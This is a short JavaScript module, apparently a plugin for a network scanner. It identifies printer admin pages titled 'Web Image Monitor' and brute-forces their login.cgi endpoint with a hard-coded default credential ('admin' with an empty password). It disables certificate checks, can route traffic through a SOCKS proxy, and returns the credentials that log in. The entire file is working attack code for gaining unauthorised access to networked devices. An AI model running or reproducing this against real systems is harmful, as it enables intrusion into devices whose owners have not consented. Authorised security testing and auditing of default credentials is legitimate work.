import got from 'got'
import SocksProxyAgent from 'socks-proxy-agent'

const credentials = {
  "admin": [""]
}

async function match_fingerprint(service, proxy){
  if(service.title.includes('Web Image Monitor')){
    return service.title
  }else{
    return false
  }
}

async function bruteforce(service, proxy){
  for(var user in credentials) {
    for(var pwd of credentials[user]) {
      let options = {
        "throwHttpErrors": false,
        "https": {rejectUnauthorized: false},
        "method": "POST",
        "body": `userid=${encodeURIComponent(btoa(user))}&password=${pwd}`,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "followRedirect": false
      }
      if(proxy != ''){
        var proxy_agent = new SocksProxyAgent(proxy) 
        options.agent = {
          http: proxy_agent,
          https: proxy_agent
        }
      }
      let response = await got(`${service.url}/web/guest/en/websys/webArch/login.cgi`, options).catch(function(err){
        console.log(`Failed Attempt: ${user}:${pwd}`); console.log(err)
      })
      if(response && response.statusCode == 302){
        return `${user}:${pwd}`
      }
    }
  }
  return false
}

export {match_fingerprint, bruteforce}
